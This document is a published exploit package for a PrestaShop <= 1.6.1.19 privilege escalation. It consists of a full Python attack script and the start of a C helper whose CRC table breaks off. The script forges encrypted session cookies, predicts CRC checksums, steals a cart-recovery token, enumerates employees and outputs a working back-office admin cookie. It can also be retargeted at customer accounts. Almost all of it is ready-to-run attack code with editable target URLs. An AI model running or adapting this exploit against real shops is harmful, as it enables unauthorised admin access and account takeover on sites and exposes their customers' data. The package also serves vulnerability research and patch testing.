<--- exploit.py --->
#!/usr/bin/env python3
# PrestaShop <= 1.6.1.19 Privilege Escalation
# Charles Fol
# 2018-07-10
#
# See https://ambionics.io/blog/prestashop-privilege-escalation
#
#
# The condition for this exploit to work is for an employee to have the same
# password as a customer. The exploit will yield a valid employee cookie for
# back office access.
#
# With a bit of tweaking, one can modify the exploit to access any customer
# account, get access to statistics, coupons, etc. or get an admin CSRF token.
#
# The attack may fail for a variety of reasons, including me messing up the
# padding somewhere. You might need to run the exploit several times.
# 
# POSSIBLE IMPROVEMENTS
# - Improve the employee detection method
# - Implement the RCE step
#
  
# gcc -o crc_xor crc_xor.c
# vi exploit.py
# ./exploit.py
  
import requests
import urllib.parse
import binascii
import string
import itertools
import sys
import os
import re
  
  
# EDIT THIS
  
BASE_URL = 'http://vmweb3.corp.lexfo.fr/prestashop'
ADMIN_URL = 'http://vmweb3.corp.lexfo.fr/prestashop/admin2904aqvyb'
  
CUSTOMER_EMAIL = 'user@user.io'
CUSTOMER_PASSWORD = 'password2'
  
  
# Helpers
  
def http_session():
    """Every HTTP session will be spawned from this function. You can add a
    proxy or custom rules.
    """
    s = requests.Session()
    #s.proxies = {'http': 'localhost:8080'}
    return s
  
def bl(string):
    """¤ is 2 bytes long, which forces us to encode strings before using len().
    """
    return len(string.encode())
  
def cs(blocks, offset=0):
    """Computes the full size of the cookie and returns it as a last 6-digit
    block.
    """
    if offset > 0:
        offset -= SIZE_BLOCK
    return [
        '%06d' % (len(blocks) * SIZE_BLOCK + offset)
    ]
  
def xor(a, b):
    """XORs two strings and returns the result as bytes.
    """
    return bytes(x ^ y for x, y in zip(a.encode(), b.encode()))
  
def pb(n, z=False):
    """Returns the padding required to align n with SIZE_BLOCK, and its position
    in blocks. The z flag indicates if padding can be zero.
    """
    padding = (- n) % SIZE_BLOCK
    if z and padding == 0:
        padding = SIZE_BLOCK
    block = (n + padding) // SIZE_BLOCK
    return padding, block
  
  
crc32 = binascii.crc32
  
SIZE_BLOCK = 8
BASE_BYTE = '`'
SIZE_LASTNAME_TO_FIRSTNAME = bl(
    '¤customer_firstname|'
)
SIZE_FIRSTNAME_TO_PASSWD = bl(
    '¤logged|1¤is_guest|¤passwd|'
)
SIZE_FIRSTNAME_TO_EMAIL = SIZE_FIRSTNAME_TO_PASSWD + bl(
    '86df199881eaf8e9bb158c4f6b71ca0a¤email|'
)
# Variable: it is properly set in PrestaShop.find_alignment
SIZE_EMAIL_TO_END = bl(
    '¤id_cart|12345¤id_guest|6¤'
)
  
ZERO_BLOCK = b'\x00' * SIZE_BLOCK
  
FIRSTNAME = BASE_BYTE * 32
CHARSET_LASTNAME = string.ascii_letters
EMAIL_DOMAIN = '@test.fr'
  
MAX_ID_CUSTOMER = 100
MAX_ID_EMPLOYEE = 100
  
  
# Exploit classes
  
  
class Exploitation:
    """Exploitation class. Handles the flow of the attack.
    The main process is the following:
  
    1. X = read(cart_id)
    2. Change password to recover_cart_X
    3. read(password)
        -> we have a token to recover the cart, and therefore the customer
           password
    4. write(id_employee, Z)
    5. write(id_customer, Y)
        -> customer Y associated with cart_id X
    6. Do the "Recover cart" procedure with the token
    7. Access backoffice. If employee's Z password is the same as customer
       Y, then we obtain backoffice access
    """
  
    def __init__(self, session, email, password):
        self.s = http_session()
        self.ps = PrestaShop(session, email, password)
        Cookie.ps = self.ps
  
    def prelude(self):
        self.ps.login()
        self.ps.find_alignment()
        self.ps.get_encrypted_numbers()
        self.ps.build_cookies()
  
    def run(self):
        """Runs the exploit.
        """
        self.prelude()
  
        id_cart = self.read_id_cart()
        token = self.read_cart_token(id_cart)
  
        self.get_employee_cookie_name()
        self.get_write_blocks()
        self.get_nb_employees()
  
        for target_customer in range(1, MAX_ID_CUSTOMER):
            if not self.associate_id_customer(target_customer):
                break
  
            for target_employee in range(1, self.nb_employees+1):
                print("Trying customer[%d] employee[%d]" % (
                    target_customer, target_employee
                ))
                cookie = self.write_id_employee(target_employee)
                cookie = self.recover_cart(id_cart, token, cookie)
  
                if cookie:
                    print('Success !!!')
                    print('Backoffice cookie:')
                    print('%s=%s' % (self.employee_cookie_name, cookie))
                    return
          
        print('No employee has the same password as a customer')
  
    def get_employee_cookie_name(self):
        """Obtains the name of the cookie for the backoffice.
        """
        self.s.get(ADMIN_URL + '/index.php')
          
        for c, v in self.s.cookies.items():
            if c.startswith('PrestaShop-'):
                self.employee_cookie_name = c
                break
        else:
            raise ValueError('Unable to find customer cookie')
  
        print('Employee cookie name: %s' % self.employee_cookie_name)
  
    def get_nb_employees(self):
        """Obtains the number of employees by requesting pdf.php with a spoofed
        id_employee cookie and iterating.
  
        It breaks after the first failure, so there might be cases where it
        fails to detect every employee.
        """
        ecn = self.employee_cookie_name
          
        for i in range(1, MAX_ID_EMPLOYEE):
            cookie = self.write_id_employee(i)
            self.s.cookies.clear()
            self.s.cookies[ecn] = str(cookie)
            r = self.s.get(ADMIN_URL + '/pdf.php', allow_redirects=False)
  
            if r.status_code != 200:
                break
  
        self.s.cookies.clear()
        self.nb_employees = i - 1
        print('There are at least %d employees' % self.nb_employees)
  
    def recover_cart(self, id_cart, token, cookie):
        """Performs the recover cart action with a cookie containing id_employee
        so that the returned cookie contains a password hash and an employee ID.
        This cookie can then be sent to the admin interface to verify it works.
        """
        s = self.s
        s.cookies.clear()
        s.cookies[cookie.name] = str(cookie)
        r = s.post(
            BASE_URL + '/index.php',
            data={
                'token_cart': token,
                'recover_cart': '%d' % id_cart
            },
            allow_redirects=False
        )
  
        s.cookies.clear()
        s.cookies[self.employee_cookie_name] = r.cookies[cookie.name]
        r = s.get(
            ADMIN_URL + '/index.php?controller=AdminDashboard',
            allow_redirects=False
        )
  
        if 'AdminLogin' not in r.headers.get('Location', ''):
            return r.cookies[self.employee_cookie_name]
  
        return None
  
    def get_write_blocks(self):
        """Gets encrypted blocks for ¤id_employee and ¤id_customer.
        """
        blocks = {}
  
        # ...¤id_
  
        cookie, block = self.pad_lastname(
            SIZE_LASTNAME_TO_FIRSTNAME + SIZE_FIRSTNAME_TO_EMAIL +
            bl(self.ps.email) +
            bl('¤id_')
        )
  
        blocks['¤id_'] = cookie.blocks[block-1]
  
        # customer and employee
  
        cookie = self.ps.set_identity(
            lastname=BASE_BYTE * self.ps.i + 'customeremployee'
        )
        blocks['customer'] = cookie.blocks[self.ps.p]
        blocks['employee'] = cookie.blocks[self.ps.p + 1]
  
        self.blocks = blocks
  
    def get_pipe_number(self, n):
        """Get the encrypted block for |000000N.
        """
        self.ps.set_identity(
            email=('%07d' + EMAIL_DOMAIN) % n
        )
        cookie, block = self.pad_lastname(
            SIZE_LASTNAME_TO_FIRSTNAME + SIZE_FIRSTNAME_TO_EMAIL - 1
        )
        return cookie.blocks[block]
  
    def write_id_person(self, person, id):
        """Writes the given employee/customer ID in the cookie.
        """
        plaintext = self.ps.email[-3:] + '¤id_%s|%07d' % (person, id)
        blocks = [
            self.blocks['¤id_'],
            self.blocks[person],
            self.get_pipe_number(id)
        ]
          
        return self.ps.writable_cookie.write(plaintext, blocks)
  
    def write_id_customer(self, id):
        """Writes id_customer for the given ID.
        """
        return self.write_id_person('customer', id)
  
    def write_id_employee(self, id):
        """Writes id_employee for the given ID.
        """
        return self.write_id_person('employee', id)
  
    def associate_id_customer(self, id):
        """Writes id_customer in our cookie in order to associate it to our cart
        ID.
        """
        s = self.s
  
        # Write id_customer|X
          
        cookie = self.write_id_customer(id)
        s.cookies.clear()
        s.cookies[cookie.name] = str(cookie)
  
        # Associate the customer with the cart
        r = s.get(
            BASE_URL + '/index.php?controller=identity',
            allow_redirects=False
        )
  
        matches = re.findall(
            'id="(firstname|lastname|email)"[^>]+value="(.*?)"',
            r.text
        )
        if not matches:
            return False
  
        matches = {k: v for k, v in matches}
        print(
            'Got customer account: {lastname} {firstname} [{email}]'.format(
                **matches
            )
        )
        return True
  
    def read_id_cart(self):
        """Get id_cart's value by padding the cookie and reading the block.
        """
        cookie, block = self.pad_lastname(
            SIZE_LASTNAME_TO_FIRSTNAME + SIZE_FIRSTNAME_TO_EMAIL +
            bl(self.ps.email) +
            bl('¤id_cart|')
        )
  
        # Since the cart ID usually fits in one block, we need to bruteforce its
        # size by changing the size of the cookie (last block contains size of
        # cookie)
        id_cart = None
        for i in range(1, 10):
            rcookie = self.ps.readable_cookie.extend(
                [cookie.blocks[block]],
                offset=i
            )
            try:
                id_cart = rcookie.read()
            except ValueError:
                break
  
        if not id_cart:
            raise ValueError('Unable to read id_cart')
  
        # ¤ is two bytes long, so the last character of the obtained id_cart
        # will be \xc2, which we need to remove
        id_cart = int(id_cart[:-1])
        print('Cart ID: %d' % id_cart)
  
        # The last try broke our cookie, and we're therefore logged out
        self.ps.login()
  
        return id_cart
  
    def read_cart_token(self, id_cart):
        """Set password to recover_cart_X and read it.
        """
        self.ps.set_identity(
            passwd='recover_cart_%d' % id_cart
        )
        cookie, block = self.pad_lastname(
            SIZE_LASTNAME_TO_FIRSTNAME + SIZE_FIRSTNAME_TO_PASSWD
        )
  
        rcookie = self.ps.readable_cookie.extend(cookie.blocks[block:block+4])
        token = rcookie.read().decode()
  
        print('Recover Cart token: %s' % token)
        return token
  
    def pad_lastname(self, offset):
        """Get a cookie where the value we want to read, which is offset bytes
        away from the last character of the lastname, is aligned with SIZE_BLOCK
        and therefore at the beginning of a block.
        """
        padding, block = pb(bl(FIRSTNAME) + offset)
  
        cookie = self.ps.set_identity(
            lastname=BASE_BYTE * (self.ps.i + padding)
        )
        block += self.ps.p
  
        return cookie, block
  
  
class CRCPredictor:
    """Implements the resolution of the CRC system of equation.
    It works by iterating on a set of possible values.
  
    For instance, let's say we obtained 3 as the last digit for cookie A.
    The only possible CRCs at this point are the ones whose last digit is 3.
    So, we store them.
    The CRCs for the next cookie, B, must necessarily validate the equation:
    CRC(B) = CRC(A) ^ CRC(A ^ B) ^ C (C is constant).
    Therefore, we can update our stored checksums by xoring them with
    CRC(A ^ B) ^ C. The stored checksums are now the candidates for B.
    Now, let's say we obtain 5 as the last digit for B. We can throw away any
    candidate which does not end with 5. By repeating this, we will reach a
    valid checksum fairly quickly.
    """
  
    ORDER = 10
  
    def __init__(self, zeros, payload_size):
        self.payloads = []
        self.digits = None
        self.candidates = None
        self.zeros = b"\x00" * zeros
        self.zero_crc = crc32(b"\x00" * (payload_size + zeros))
  
    def purge_candidates(self, digits):
        """Removes candidates that do not end with given digits, and candidates
        with less than 10 digits.
        """
        ORDER = self.ORDER
        candidates = self.candidates
  
        if candidates is not None:
            candidates = [
                c for c in candidates if c % ORDER == digits
            ]
        # The very first set of candidates (before the first char) is the
        # entirety of [0, 2**32-1], which is way too big, so we only compute
        # candidates after the two first digits have been set.
        elif self.digits is None:
            self.digits = digits
        else:
            print("Generating first solution range (takes some time) ...")
            d = self.delta(self.payloads[-2], self.payloads[-1])
            candidates = [
                i ^ d for i in range(10 ** 9 + self.digits, 0x100000000, ORDER)
                if (i ^ d) % ORDER == digits
            ]
  
        self.candidates = candidates
  
    def has_solution(self):
        """Returns true if the system has been solved.
        """
        return self.candidates is not None and len(self.candidates) <= 1
  
    def solution(self):
        """Returns the solution.
        """
        return self.candidates[0]
  
    def delta(self, p0, p1):
        """Computes CRC(A ^ B) ^ C.
        """
        d = xor(p0, p1)
        return crc32(d + self.zeros) ^ self.zero_crc
  
    def update_candidates(self, payload):
        """Updates every candidate CRC for next payload by xoring them with
        CRC(A ^ B) ^ C.
        """
        ORDER = self.ORDER
        self.payloads.append(payload)
  
        if self.candidates is None:
            return set(range(ORDER))
  
        delta = self.delta(self.payloads[-2], self.payloads[-1])
  
        self.candidates = [
            crc ^ delta
            for crc in self.candidates
        ]
        # Only keep 10-digit values as other values are not used
        self.candidates = [
            c for c in self.candidates if c >= 1000000000
        ]
  
        if not self.candidates:
            raise ValueError('Checksum equations have no solution !')
  
        # Return possible last digits for the new char
        return set(c % ORDER for c in self.candidates)
  
  
class PrestaShop:
    """Contains several helpers for the interaction with the PrestaShop website
    and cookie manipulation. Responsible for the read and write exploit
    primitives.
    """
  
    def __init__(self, session, email, password):
        self.s = session
        self.email = email
        self.original_email = self.email
        self.password = password
        self.original_password = self.password
  
    def post(self, url, **kwargs):
        headers = kwargs.get('headers', {})
        headers['Referer'] = url
        return self.s.post(BASE_URL + url, **kwargs)
  
    def cookie(self):
        """Extracts the cookie from the requests session.
        """
        for c, v in self.s.cookies.items():
            if c.startswith('PrestaShop-'):
                return Cookie(c, v)
  
        raise ValueError('Unable to find customer cookie')
  
    def login(self):
        """Logs into PrestaShop using email/password.
        """
        self.s.cookies.clear()
        r = self.post(
            '/index.php?controller=authentication',
            data={
                'email': self.email,
                'passwd': self.password,
                'back': 'identity',
                'SubmitLogin': ''
            },
            allow_redirects=False
        )
  
        if not r.headers.get('Location', '').endswith('controller=identity'):
            raise ValueError('Invalid credentials')
  
        return self.cookie()
  
    def set_identity(self, **data):
        """Changes the identity of the current user. This generally involves
        changing firstname, lastname, and email.
        """
        assert all(v != '' for v in data.values()), (
            "Data contains an empty value"
        )
  
        if 'email' in data:
            self.email = data['email']
        if 'passwd' in data:
            data['confirmation'] = data['passwd']
  
        defaults = {
            'id_gender': '1',
            'firstname': FIRSTNAME,
            'lastname': 'User',
            'email': self.email,
            'days': '1',
            'months': '1',
            'years': '1990',
            'old_passwd': self.password,
            'passwd': '',
            'confirmation': '',
            'submitIdentity': ''
        }
        defaults.update(data)
        r = self.post(
            '/index.php?controller=identity',
            data=defaults
        )
  
        if 'passwd' in data:
            self.password = data['passwd']
  
        # If we changed the email or the password, we need to login again
        if 'email' in data:
            return self.login()
  
        return self.cookie()
  
    def find_alignment(self):
        """Obtains the position of the first repeated block of customer_lastname
        along with its offset from the start of the string. Also, computes
        SIZE_EMAIL_TO_END.
  
        Example:
        ...customer_lastname|BBAAAAAAAAAAAAAAAA...
        ...----++++++++--------++++++++--------...
                             ^^ Offset = 2
                               ^ Position of the first repeated block
        """
        cookie = self.set_identity(
            lastname='A' * SIZE_BLOCK * 4
        )
  
        #print(setup_cookie)
  
        last = None
        for p, block in enumerate(cookie.blocks):
            if block == last:
                break
            last = block
        else:
            raise ValueError('Unable to find identical blocks')
  
        p = p - 1
        print('First identical block:', p, block)
  
        # Pad with Bs until the first block is modified to obtain alignment
  
        for i in range(1, SIZE_BLOCK):
            cookie = self.set_identity(
                lastname=('B' * i) + ('A' * (SIZE_BLOCK * 4 - i))
            )
            if cookie.blocks[p] != block:
                break
        else:
            raise ValueError('Unable to pad blocks')
  
        i = i - 1
        print('Offset from "customer_lastname|":', i)
  
        self.p = p
        self.i = i
  
        # We also need to setup this length dynamically
  
        global SIZE_EMAIL_TO_END
  
        # Fix the id_connection problem
        self.login()
  
        # Grab 10 slightly different cookies, and get the longest one
        max_size = max(
            self.set_identity(lastname=c * 8).size()
            for c in 'ABCDEFGHIJ'
        )
  
        SIZE_EMAIL_TO_END = (
            max_size - (
                self.p * SIZE_BLOCK - self.i +
                8 +
                SIZE_LASTNAME_TO_FIRSTNAME +
                bl(FIRSTNAME) +
                SIZE_FIRSTNAME_TO_EMAIL +
                bl(self.original_email) +
                bl('checksum|') +
                10
            )
        )
        print('Size from "email|" to end: %d' % SIZE_EMAIL_TO_END)
  
  
    def get_encrypted_blocks(self, blocks):
        """Uses the email address to get a bunch of encrypted blocks.
        """
        # Align the first character of the email with a block so that we obtain
        # 15 blocks per try        
        # SIZE_CUSTOMER_LASTNAME_KEY_TO_EMAIL =
        distance = - self.i + bl(
            '¤customer_firstname|' + FIRSTNAME
        ) + SIZE_FIRSTNAME_TO_EMAIL
        alignment, first_block = pb(distance)
        first_block += self.p
  
        cookie = self.set_identity(
            lastname='A' * alignment,
            email=''.join(blocks) + EMAIL_DOMAIN
        )
        return cookie.blocks[first_block:first_block+len(blocks)]
  
    def get_encrypted_numbers(self, size=1):
        """Builds blocks starting with numbers and cipher them.
        """
        encrypted_numbers = []
  
        # 15 blocks can be ciphered at once:
        # |email| = 128, |domain| = 8
        # |email| - |domain| = 120
        # 120 / SIZE_BLOCK = 15
        step = 15
        for i in range(0, 10 ** size, step):
            # Convert the each of number into a block:
            # 3 -> 03xxxxxx
            numbers = [
                str(i+n).rjust(size, '0').ljust(SIZE_BLOCK, 'x')
                for n in range(step)
            ]
            encrypted_numbers += self.get_encrypted_blocks(numbers)
  
        self.reset()
        self.encrypted_numbers = encrypted_numbers[:10 ** size]
  
    def discover_crc(self):
        """By correctly padding the cookie, we can force the last digit of the
        CRC to be in the last block, on its own. From this, and by using the
        email field to translate, we can guess what this digit is by replacing
        the last block by 0xxxxxx, 1xxxxxx, 2xxxxxx, etc. until the
        cookie is accepted.
        Then, we can slightly change the cookie's content, and obtain the last
        digits for the new checksum. Due to the fact that CRC is affine, we can
        build an equation on the last two digits of these checksums.
        By repeating the operation, we get a set of equations, and solving it
        reveals the value of the checksum.
  
        Returns a magic cookie and its checksum.
        """
  
        print('Discovering CRC checksum...')
  
        lo_digits = 1
        nb_requests = 0
  
        encrypted_numbers = self.encrypted_numbers
  
        # We only work with 10-digit checksums, and the probability of not
        # getting any 10-digit checksum over 10 requests is equal to 4.68e-07,
        # so we'll iterate 10 times and keep the longest cookie
          
        max_size = 0
        cookie_base = None
  
        for i in range(10):
            cookie_base = self.set_identity(
                lastname=CHARSET_LASTNAME[i] * SIZE_BLOCK
            )
            if max_size < cookie_base.size():
                max_size = cookie_base.size()
  
        # Checksum alignment: build a cookie such that the last block contains
        # lo_digits digits
  
        alignment_checksum = ((lo_digits - max_size) % SIZE_BLOCK) + SIZE_BLOCK
  
        s = http_session()
  
        payload_size = 2
        zeros = (
            SIZE_LASTNAME_TO_FIRSTNAME +
            bl(FIRSTNAME) +
            SIZE_FIRSTNAME_TO_EMAIL +
            bl(self.original_email) +
            SIZE_EMAIL_TO_END
        )
        lastname = None
        predictor = CRCPredictor(zeros, payload_size)
        cache = {}
  
        # On each iteration, we replace some chars and keep the same length,
        # so that the affine property of CRC stays valid.
        # We then update our candidates using CRCPredictor, until one value's
        # left.
        for payload in itertools.product(CHARSET_LASTNAME, repeat=payload_size):
            payload = ''.join(payload)
            lastname = 'A' * (alignment_checksum - payload_size) + payload
            cookie = self.set_identity(
                lastname=lastname
            )
            nb_requests += 1
  
            # Only use 10-digit cookies
            if cookie.size() % SIZE_BLOCK != lo_digits:
                continue
  
            candidates = predictor.update_candidates(payload)
  
            # No point verifying if we have only one possibility, skip
            if len(candidates) == 1:
                predictor.purge_candidates(list(candidates)[0])
                if predictor.has_solution():
                    break
                continue
  
            # If the single-digit block has already been seen, we can map it
            # immediately
  
            original_block = cookie.blocks[-2]
  
            if original_block in cache:
                n = cache[original_block]
                print('%s %d %s !' % (payload, n, original_block))
                predictor.purge_candidates(n)
                continue
  
            #print(cookie)
            #print(candidates)
  
            # Bruteforce the last digit of the checksum by replacing the last
            # block by an encrypted number until it works
            for n in candidates:
                cookie.blocks[-2] = encrypted_numbers[n]
                print('%s %d %s' % (payload, n, cookie.blocks[-2]), end='\r')
  
                response = s.head(
                    BASE_URL + '/index.php?controller=identity',
                    headers={'Cookie': '%s=%s' % (cookie.name, cookie)}
                )
                nb_requests += 1
                location = response.headers.get('Location', '')
                if 'controller=authentication' not in location:
                    print('')
                    break
            else:
                # This should not happen
                raise ValueError(
                    'Unable to guess digits for payload %r' % payload
                )
  
            cache[original_block] = n
            predictor.purge_candidates(n)
  
            cookie.blocks[-2] = original_block
  
            if predictor.has_solution():
                break
        else:
            # This should not happen
            raise ValueError('Unable to compute checksum value')
  
        checksum = predictor.solution()
        print('Checksum discovered: %s (%d requests)' % (checksum, nb_requests))
          
        return cookie, checksum
  
    def build_cookies(self):
        self.build_writable_cookie()
        self.build_readable_cookie()
  
    def build_writable_cookie(self):
        """Builds the first extendable cookie. It involves finding out the
        checksum value, and building the standard ending blocks.
        """
  
        cookie, checksum = self.discover_crc()
          
        # ¤ custom
        block_o = self.set_identity(
            lastname='A' * (self.i + SIZE_BLOCK)
        ).blocks[self.p + 1]
  
        # AAAAA¤ c
        block_c = self.set_identity(
            lastname='A' * (self.i + 5)
        ).blocks[self.p]
  
        # hecksum|
        offset = (
            SIZE_LASTNAME_TO_FIRSTNAME +
            bl(FIRSTNAME) +
            SIZE_FIRSTNAME_TO_EMAIL +
            bl(self.email) +
            SIZE_EMAIL_TO_END +
            bl('checksum|')
        )
        offset, _ = pb(offset) 
        block_s = self.set_identity(
            lastname='A' * (self.i + offset)
        ).blocks[-4]
  
        WritableCookie.blocks_checksum = [
            block_o,
            block_c,
            block_s
        ]
        self.writable_cookie = WritableCookie(
            cookie.name, cookie.blocks, checksum
        )
        print('Generated extendable cookie.')
  
    def build_readable_cookie(self):
        """To read arbitrary blocks we need to integrate the checksum and add
        customer_firstname|... at the end.
        """
          
        p = self.p
        i = self.i
          
        # AAA¤ customer_firstname|````````
        # ++++++++--------++++++++--------
        c0 = self.set_identity(
            lastname='A' * (i + 3)
        )
  
        cookie = self.writable_cookie
        self.readable_cookie = cookie.eat_checksum(3, c0.blocks[p:p+4])
        print('Generated read cookie.')
  
    def reset(self):
        return self.set_identity(
            email=self.original_email,
            passwd=self.original_password
        )
  
  
class Cookie:
    """Standard Prestashop cookie class. Splits the cookie into blocks.
    """
  
    def __init__(self, name, value):
        self.name = name
        if isinstance(value, str):
            self.check_consistent(value)
            self.blocks = urllib.parse.unquote(value).split('=')
        else:
            self.blocks = value
  
    def check_consistent(self, value):
        """Checks if the given string is a valid ECB cookie.
        """
        value = urllib.parse.unquote(value)
        if not re.match('([0-9A-Za-z/+]{11}=)*[0-9]{6}', value):
            raise ValueError('Invalid cookie')
  
  
    def clone(self):
        return self.__class__(self.name, str(self))
  
    def size(self):
        """Last block is the size of the whole payload.
        """
        return int(self.blocks[-1])
  
    def __str__(self):
        return '='.join(self.blocks).replace('+', '%2B')
  
class WritableCookie(Cookie):
    """Cookie with known checksum. It can be extended by adding encrypted blocks
    with a known plaintext, and recomputing the checksum.
    """
  
    blocks_checksum = None
  
    def __init__(self, name, blocks, checksum):
        super().__init__(name, blocks)
        self.checksum = checksum
  
    def write(self, plaintext, blocks):
        """Adds blocks to current cookie, recomputes the checksum, and returns
        the new cookie.
        """
        assert bl(plaintext) == len(blocks) * SIZE_BLOCK, (
            "Plaintext's size does not match blocks'"
        )
  
        # Compute the new checksum and get its encrypted blocks
        plaintext = (
            'ch' +
            plaintext +
            '¤custom' +
            'AAAAA¤'
        )
        checksum = crc32(plaintext.encode(), self.checksum)
        encrypted_checksum = self.ps.get_encrypted_blocks([
            '%08d' % (checksum // 100),
            '%02dxxxxxx' % (checksum % 100)
        ])
        self.ps.reset()
          
        # PLAINTEXT ORIGIN
        # ¤ custom  customer_firstname }
        # AAAAA¤ c  customer_firstname } blocks_checksum
        # hecksum|  discover           }
        # 12345678  email
        # 90xxxxxx  email
        blocks = (
            self.blocks[:-4] +
            blocks +
            self.blocks_checksum +
            encrypted_checksum
        )
        blocks += cs(blocks, 2)
  
        return WritableCookie(self.name, blocks, checksum)
  
    def eat_checksum(self, rotations, read_blocks):
        """Adds a correction block to the cookie so that the checksum stays the
        same, and the last key/value pair is freed. End represents the plaintext
        that is meant to be added after the correction block.
  
        Initial cookie end:
        ¤checksum|1234567890
        New cookie end:
        ¤checksum|1234567890       ABCDEFGH
        Where ABCDEFGH is the correction block.
        New cookie end with added KVP:
        ¤checksum|1234567890       ABCDEFGH¤customer_lastname|ABC...
  
        This allows to add another key/value pair, which won't be included in
        the checksum computation, at the end of the cookie. This pair can be
        anything and therefore include blocks with unknown plaintext.
        """
  
        # Add a correction block such that the CRC of the cookie does not change
        # Note: the last block is supposed to be padded with spaces, but the
        # code is broken. It will add 1 space instead of 7 in our case, the
        # rest will be null bytes.
        added = 'checksum|%010d \x00\x00\x00\x00\x00\x00' % self.checksum
        current_checksum = crc32(added.encode(), self.checksum)
  
        # Goal: crc32(correction_block, current_checksum) == self.checksum
        os.system('./crc_xor %u %u %u' % (
            current_checksum,
            self.checksum,
            rotations
        ))
        with open('./crc_xor_result', 'r') as h:
            correction_block = h.read()
  
        print('Got correction block: %s' % correction_block)
        c = self.ps.set_identity(
            lastname='A' * self.ps.i + correction_block
        )
        blocks = self.blocks[:-1] + [c.blocks[self.ps.p]] + read_blocks
        blocks += cs(blocks)
          
        return ReadableCookie(self.name, blocks)
  
  
class ReadableCookie(Cookie):
    """Cookie which ate its checksum. The last value can contain anything.
    It can be used to decipher arbitrary data:
  
    >>> rc.extend(['SUsidYDY']).read()
    'hello123'
    """
  
    def __init__(self, name, value):
        super().__init__(name, value)
        self.response = None
  
    def extend(self, blocks, offset=0):
        blocks = self.blocks[:-1] + blocks
        blocks += cs(blocks, offset)
        return self.__class__(self.name, blocks)
  
    def request(self):
        if not self.response:
            s = http_session()
            response = s.get(
                BASE_URL + '/index.php?mobile_theme_ok=1',
                headers={
                    'Cookie': '%s=%s' % (self.name, self)
                }
            )
            self.response = response    
        return self.response  
  
    def read(self):
        response = self.request()
        match = re.search(b'>````````(.*?) A+..<', response.content, flags=re.S)
        if not match:
            raise ValueError('Unable to find firstname/lastname in page')
        return match.group(1)
  
  
s = http_session()
  
exploit = Exploitation(
    s,
    CUSTOMER_EMAIL,
    CUSTOMER_PASSWORD
)
  
try:
    exploit.run()
except Exception as e:
    raise e
finally:
    exploit.ps.reset()
  
</--- exploit.py --->
  
<--- crc_xor.c --->
/*
gcc -O3 -o crc_xor crc_xor.c
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
  
  
#define MIN_VALUE 65
#define MAX_VALUE 122
  
#define SIZE_CORRECTION_BLOCK 8
#define OUTPUT_FILE_FORMAT "./%s_result"
  
/* generated using the AUTODIN II polynomial
 *  x^32 + x^26 + x^23 + x^22 + x^16 +
 *  x^12 + x^11 + x^10 + x^8 + x^7 + x^5 + x^4 + x^2 + x^1 + 1
 */
  
char filename[32];
  
static const uint crc32tab[256] = {
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba,
    0x076dc419, 0x706af48f, 0xe963a535, 0x9e6495a3,
    0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91,
    0x1db71064, 0x6ab020f2, 0xf3b97148, 0x84be41de,
    0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec,
    0x14015c4f, 0x63066cd9, 0xfa0f3d63, 0x8d080df5,
    0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b,
    0x35b5a8fa, 0x42b2986c, 0xdbbbc9d6, 0xacbcf940,
    0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116,
    0x21b4f4b5, 0x56b3c423, 0xcfba9599, 0xb8bda50f,
    0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d,
    0x76dc4190, 0x01db7106, 0x98d220bc, 0xefd5102a,
    0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818,
    0x7f6a0dbb, 0x086d3d2d, 0x91646c97, 0xe6635c01,
    0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457,
    0x65b0d9c6, 0x12b7e950, 0x8bbeb8ea, 0xfcb9887c,
    0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2,
    0x4adfa541, 0x3dd895d7, 0xa4d1c46d, 0xd3d6f4fb,
    0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9,
    0x5005713c, 0x270241aa, 0xbe0b1010, 0xc90c2086,
    0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4,
    0x59b33d17, 0x2eb40d81, 0xb7bd5c3b, 0xc0ba6cad,
    0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683,
    0xe3630b12, 0x94643b84, 0x0d6d6a3e, 0x7a6a5aa8,
    0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe,
    0xf762575d, 0x806567cb, 0x196c3671, 0x6e6b06e7,
    0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5,
    0xd6d6a3e8, 0xa1d1937e, 0x38d8c2c4, 0x4fdff252,
    0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60,
    0xdf60efc3, 0xa867df55, 0x316e8eef, 0x4669be79,
    0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f,
    0xc5ba3bbe, 0xb2bd0b28, 0x2bb45a92, 0x5cb36a04,
    0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
